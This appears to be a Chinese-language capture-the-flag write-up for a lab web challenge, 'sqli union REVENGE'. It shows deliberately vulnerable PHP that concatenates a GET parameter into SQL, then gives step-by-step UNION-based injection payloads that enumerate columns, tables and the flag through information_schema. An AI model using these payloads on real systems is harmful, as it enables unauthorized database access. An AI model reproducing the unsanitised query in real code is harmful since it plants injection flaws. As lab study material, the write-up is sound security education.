#Web 

## 題目

**sqli union REVENGE**
給了一個網址，點開來
![[W1-24_web.png|center|700]]
點 `Source Code`，跟 [[Sqli union]] 一樣
簡化：
```php
<?php
	include 'config.php';
	
	$id = $_GET['id'] ?? 1;
	$query = "SELECT * FROM posts WHERE id = $id";
?>

---

<body>
    <h1><?php echo $post['title']; ?></h1>
    <hr>
    <p><?php echo nl2br($post['content']); ?></p>
    <a class="btn btn-secondary" href="/?sauce=true">Source Code</a>
</body>
```

但這次沒有提示 table 名稱和目標 column

---
## 解題
1. 觀察 source code
   ```
   SELECT * FROM posts WHERE id = $id
   ```
	沒有限制 id 的輸入內容 -> 可以在網址後面加上 ?id=... UNION
2. 取得 table `post` 的欄位數，輸入
   ```SQL
   ?id=-1 UNION SELECT 1;--
	?id=-1 UNION SELECT 1, 2;--
	?id=-1 UNION SELECT 1, 2, 3;--
	 ...
   ```
	
	-> 發現直到 SELECT 1, 2, 3 才沒有報 syntax error
	-> 總共有 3 個欄位
	![[W1-24_col.png|161]]
3. 獲得資料庫名稱 
   將資料庫名稱的 function 放到第二欄位，使名稱印到網頁的大標上
   ```SQL
   ?id=-1 UNION SELECT 1,database(),3-- 
   ```
   ![[W1-24_table-name.png|232]]
   -> 只有一個 DB 且 DB 名稱為 `sqli_demo`
4. 獲得資料庫有哪些 tables
   >table 不只一個 -> 使用 `GROUP_CONCAT()`，將多筆資料的欄位值串接合併成單一字串
   >比如原本回傳
   >```
   >a
   >b
   >c
   >```
   >有時候因為題目設計，只會顯示第一個結果，
   >`GROUP_CONCAT()` 後回傳
   >```
   >a, b, c
   >```
   
   將 `GROUP_CONCAT(table_name)` 放到第二欄位，使名稱印到網頁的大標上
   ```SQL
   ?id=-1 UNION SELECT 1, GROUP_CONCAT(table_name), 3 FROM information_schema.tables WHERE table_schema='sqli_demo'-- 
   ``` 
   ![[W1-24_tables.png|304]]
   -> 發現奇怪的 table 名稱 `flagsbutwithdangerdinosaur`
5. 獲得 table 有哪些 columns
   ```SQL
   ?id=-1 UNION SELECT 1, GROUP_CONCAT(column_name), 3 FROM information_schema.columns WHERE table_name='flagsbutwithdangerdinosaur'-- 
   ``` 
   ![[W1-24_cols.png|222]]
   -> 發現奇怪的 column 名稱 `flag_with_strange_suffix`

6. 獲得表中的內容
   ```SQL
   ?id=-1 UNION SELECT 1, flag_with_strange_suffix, 3 FROM flagsbutwithdangerdinosaur
   ``` 
   ![[W1-24_flag.png|423]]
7. flag = `CTF{sqli_union_rev_web_bf966c2bb9423f4b8beeb1b1}`











